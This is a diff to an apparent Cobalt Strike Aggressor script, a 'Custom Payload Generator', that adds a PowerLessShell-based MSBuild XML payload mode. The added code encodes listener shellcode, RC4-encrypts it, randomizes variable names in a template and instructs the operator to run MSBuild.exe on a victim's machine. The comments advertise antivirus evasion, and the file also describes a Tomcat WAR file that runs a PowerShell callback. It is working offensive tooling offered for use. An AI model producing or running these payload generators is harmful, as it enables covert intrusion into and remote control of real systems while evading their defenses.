@@ -1,6 +1,6 @@
 # Custom Payload Generator
 # Author: Alex Williams
-# v1.0 11/28/2018
+# v1.0.5 12/06/2018
 # Contact: @offsec_ginger
 # Site: https://stormctf.ninja
 # GH: https://github.com/offsecginger
@@ -28,6 +28,16 @@
 # WAR Generator:
 #
 #	Build a WAR file that once uploaded to Tomcat, executes a PowerShell callback.
+
+# PowerLessShell based MSBuild XML Generator:
+#
+#	Build an XML document that can be run with MSBuild.
+#	.NET 4.0 required on victim host.
+# 	This is based on the PowerLessShell shellcode implementation
+#	found here: https://github.com/Mr-Un1k0d3r/PowerLessShell
+#	Higher success rate at evading A/V than original MSBuild module.
+#	NOTE: Python must be installed, because writing the RC4 alg in 
+#	Sleep is ridiculous.
 
 # Change this to set the payloads to External/Internal Hosts / IPs
 
@@ -97,7 +107,7 @@ sub generate_payload {
 	dialog_description($dialog, "Generates a payload from a user created template.");
 	drow_listener($dialog, "listener", "Listener: ");
 	drow_combobox($dialog, "payload_type", "Payload Type: ", @("Staged","Stageless"));
-	drow_combobox($dialog, "output", "Output: ", @("MSBuild XML","JSC JScript","Windows JScript", "JSP","WAR"));
+	drow_combobox($dialog, "output", "Output: ", @("MSBuild XML","JSC JScript","Windows JScript", "JSP","WAR","PowerLessShell"));
 	drow_checkbox($dialog, "x64", "x64: ", "Use x64 Payload")
 	dbutton_action($dialog, "Generate");
 	dialog_show($dialog);
@@ -249,6 +259,43 @@ sub output {
 			artifact_stageless($3['listener'], "powershell", $arch, "", &ps1stageless_war);
 		}
 	}
+	else if ($3['output'] eq 'PowerLessShell') {
+		$arch = "x86";
+		if ($3['x64'] eq "true") {
+			$arch = "x64";
+		}
+		if ($3['payload_type'] eq "Staged" || $3['payload_type'] eq "Stageless") {
+			if ($3['payload_type'] eq "Staged") {
+				show_message("Stageless Payload Only for PowerLessShell.");
+			}
+			$payload_string = base64_encode(shellcode($3['listener'], false, $arch));
+			$handle = openf(script_resource("./templates/powerlessshell_template.xml"));
+			$data   = readb($handle, -1);
+			$rc4key = random_string("32");
+			$key_formatted = format_rc4($rc4key);
+			$rc4_python = script_resource("./assets/rc4.py");
+			$runrc4 = exec("python ".$rc4_python ." $rc4key \"$payload_string\"");
+			@result = readAll($runrc4);
+			$encrypted_payload = @result[0];
+			closef($runrc4);
+			$fdata = $data;
+			for ($r = 0; $r < 50; $r++) {
+				$rstring = random_string(rand(range("5-10")));
+				$data = strrep($data, "%%VAR".$r."%%", $rstring);
+			}
+			$fdata = strrep($data, "%%PAYLOAD%%", $encrypted_payload, "%%KEY%%", $key_formatted);
+			closef($handle);
+			$name = prompt_file_save("payload.xml", {
+				local('$outfile');
+				$outfile = openf("> $+ $1");
+				writeb($outfile, $fdata);
+				closef($outfile);
+				$filename = pop(split("/", $1));
+				prompt_text("Execute the below on a victim's machine.", "\%WINDIR\%\\Microsoft.NET\\Framework\\v4.0.30319\\MSBuild.exe ". $filename, {
+				});
+			});
+		}
+	}
 }
 
 sub ps1stageless_xml {
@@ -301,7 +348,7 @@ sub ps1stageless_war {
 
 
 sub random_string {
-	$limit = rand(range("5-". int($1)));
+	$limit = $1;
 	@random_str = @();
 	$characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
 	for ($x = 0; $x < $limit; $x++) {
@@ -317,4 +364,10 @@ sub exe {
 	$handle = openf(">$TEMPDIR". $filename .".exe");
 	writeb($handle, $1);
 	closef($handle);
+}
+
+sub format_rc4 {
+	$key = $1;
+	@fmt = str_chunk(transform($key, "hex"), 2);
+	return "0x". join(", 0x", @fmt);
 }
